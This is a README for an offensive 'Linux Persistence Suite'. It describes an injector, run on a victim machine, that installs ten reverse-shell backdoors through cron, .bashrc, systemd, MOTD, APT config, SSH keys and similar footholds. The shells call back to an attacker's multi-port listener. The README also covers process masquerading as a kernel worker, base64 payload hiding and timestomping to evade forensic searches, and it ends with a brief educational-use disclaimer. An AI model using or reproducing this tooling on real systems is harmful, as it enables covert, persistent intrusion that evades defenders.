# Linux Persistence Suite

This toolkit automates the deployment and management of 10 different Linux persistence mechanisms. It consists of an **Injector** (run on victim) and a **Listener** (run on attacker).

## Components

### 1. `injector.sh`
This script must be run on the target Linux machine (preferably as root for maximum coverage). It automatically installs backdoors via:
1.  **SUID Binary** (Port 4001)
2.  **Crontab** (Port 4002)
3.  **.bashrc** (Port 4003)
4.  **if-up.d** (Port 4004)
5.  **Systemd User Service** (Port 4005)
6.  **Systemd Timer** (Port 4006)
7.  **MOTD** (Port 4007)
8.  **XDG Autostart** (Port 4008)
9.  **APT Config** (Port 4009)
10. **SSH Authorized Keys** (Port 4010)

### 2. `listener.py`
This script runs on your machine (Kali/C2). It listens on all ports from **4001 to 4010** simultaneously. You can view which backdoors have triggered and choose to interact with any active shell.

## Usage Guide

### Step 1: Start the Listener (Attacker)
On your machine (IP: `192.168.1.5` for example):

```bash
python3 listener.py
```
You will see a dashboard showing the status of all 10 ports.

### Step 2: Inject the Victim
Transfer `injector.sh` (and optionally `masquerade.c`) to the target machine.

#### Option A: Basic Mode (Bash Base64)
Good for systems without GCC. Payloads are Base64 encoded to hide plain text strings on disk.
```bash
chmod +x injector.sh
./injector.sh <LHOST_IP>
# Example: ./injector.sh 192.168.1.5
```

#### Option B: Stealth Mode (C Compiled)
**Requires `gcc` on target**. Compiles a C binary for each port that uses **Process Masquerading**.
- **Benefit**: `ps aux` will show `[kworker/u4:0]` instead of `bash -i`.
- **How**:
```bash
./injector.sh <LHOST_IP> --stealth
```
*(The script looks for `masquerade.c` in the current folder. If missing, it uses a built-in minimal template).*

### Step 3: Manage Connections
Back on the listener, you will see ports changing status to `Connected`.

**Commands:**
- `i <port>`: Switch to the shell on that port. (e.g., `i 4002`)
    - Inside the shell, press **Ctrl+C** to detach and return to the main menu.
- `kill <port>`: Terminate the connection on that port.
- `quit`: Exit the listener.

### Advanced Features

#### 1. Anti-Forensics (Timestomping)
The script employs **Advanced Timestomping**. Instead of using the `touch` command (which leaves execution traces), it uses **direct System Calls** via Python/Perl to modify file timestamps (`atime`, `mtime`).
- **Effect**: If the script modifies `/etc/network/if-up.d/upstart`, it automatically restores the original "Last Modified" time from 2023 (or whenever it was).
- **Result**: Bypasses `find / -mtime -1` hunts.

#### 2. Cleanup Mode
To remove all backdoors and restore the system to its original state:
```bash
./injector.sh <LHOST_IP> --clean
```
This command:
1. Removes all 10 injected payloads.
2. Deletes binaries and services.
3. Restores config files (`.bashrc`, `authorized_keys`) to their clean state (preserving timestamps).

## Requirements
- **Injector**: Bash (Standard on Linux). Root privileges recommended for methods 1, 4, 6, 7, 9.
- **Listener**: Python 3.

## Disclaimer
This tool is for educational purposes and authorized security testing only.
